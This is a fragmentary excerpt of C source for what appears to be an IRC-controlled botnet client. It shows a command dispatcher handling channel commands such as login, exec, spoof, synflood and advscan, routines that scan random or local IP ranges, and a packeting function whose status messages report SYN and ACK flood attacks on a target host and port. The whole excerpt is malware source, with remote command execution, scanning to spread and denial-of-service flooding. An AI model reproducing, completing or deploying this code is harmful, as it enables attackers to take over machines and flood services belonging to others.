...
int pub_requests(sock_t *sp, requests_t *req) 
{
	...
	while (token != NULL) 
	{
		...
		{
			if (! wordcmp(":.login", req))
				cmd_login(sp, req);

			if (login_control(req) == EXIT_SUCCESS && login_status == true)
			{
				if (! wordcmp(":.logout", req))
					cmd_logout(sp, req);
				else if (! wordcmp(":.exec", req))
					cmd_exec(sp, req, token);
				else if (! wordcmp(":.version", req))
					cmd_version(sp);
				else if (! wordcmp(":.status", req))
					cmd_status(sp);
				else if (! wordcmp(":.help", req))
					cmd_help(sp);
				else if (! wordcmp(":.spoof", req))
					cmd_spoof(sp, req);
				...
				else if (! wordcmp(":.stop", req))
					cmd_stop(sp);
				else if (! wordcmp(":.synflood", req) ||
				...
				else if (! wordcmp(":.setchan", req))
					cmd_setchan(sp, req);
				else if (! wordcmp(":.join", req))
					cmd_join(sp, req);
				else if (! wordcmp(":.part", req))
					cmd_part(sp, req);
				else if (! wordcmp(":.quit", req))
					cmd_quit(sp, req);
			}
		}
		token = strtok(NULL, "\n");
...
{
	if (!max_pids)
		sockwrite(sp->sockfd, "PRIVMSG %s :[status] currently not working.\n", 
		channel);
	else
		sockwrite(sp->sockfd, "PRIVMSG %s :[status] working on %s\n", 
		channel, status_temp);
	return;
}
...
void cmd_spoof(sock_t *sp, requests_t *req)
{
	if (parse_input_errors(sp, req, 1, 0))
		return;
...
int cmd_advscan(sock_t *sp, requests_t *req) 
{
	...
	{
		if (parse_input_errors(sp, req, 2, 0))
			return EXIT_FAILURE;
		else if (parse_input_errors(sp, req, 2, 1))
			return EXIT_FAILURE;
	}
...
int cmd_advscan_recursive(sock_t *sp, requests_t *req) 
{
	if (strcmp(req->rcv_sb, ":.advscan->recursive") == 0) 
	{
		...
		{
			memset(req->rcv_sb, 0, sizeof(req->rcv_sb));
			if (parse_input_errors(sp, req, 3, 1))
				return EXIT_FAILURE;
	...
	else if (strlen(req->rcv_sb) && strlen(req->rcv_sc)) 
	{
		...
		if (parse_input_errors(sp, req, 2, 1))
			return EXIT_FAILURE;
		memset(req->rcv_sb, 0, sizeof req->rcv_sb);
	}
...
int cmd_advscan_random(sock_t *sp, requests_t *req, int t) 
{
	...
	if (!t)
	{
		...
		if (!pid) 
		{
			snprintf(req->rcv_sb, sizeof(req->rcv_sb), "%u",
			random_num);
			sleep(1);
			random_ct = rand();
			random_num = ((random_ct % 254) + 1);
			snprintf(req->rcv_sc, sizeof(req->rcv_sc), "%u",
			random_num);
	...
	else
	{
		...
		{
			if(all_messages)
				sockwrite(sp->sockfd, "PRIVMSG %s :[error] unable to get local ip, switching to random scan..\n", 
				channel);
			cmd_advscan_random(sp, req, 0);			
		}
	}
...
int cmd_packeting(sock_t *sp, requests_t *req)
{
	...
	if (parse_input_errors(sp, req, 3, 0))
		return EXIT_FAILURE;
	...
	if (!pid) 
	{
		...
		{
			snprintf(status_temp, sizeof(status_temp), "synflood packeting %s:%u (secs: %u)", 
			req->rcv_sb, uport, useconds);
		...
		{
			snprintf(status_temp, sizeof(status_temp), "ngsynflood packeting %s:%u (secs: %u)", 
			req->rcv_sb, uport, useconds);
		...
		{
			snprintf(status_temp, sizeof(status_temp), "ackflood packeting %s:%u (secs: %u)", 
			req->rcv_sb, uport, useconds);
		...
		{
			snprintf(status_temp, sizeof(status_temp), "ngackflood packeting %s:%u (secs: %u)", 
			req->rcv_sb, uport, useconds);
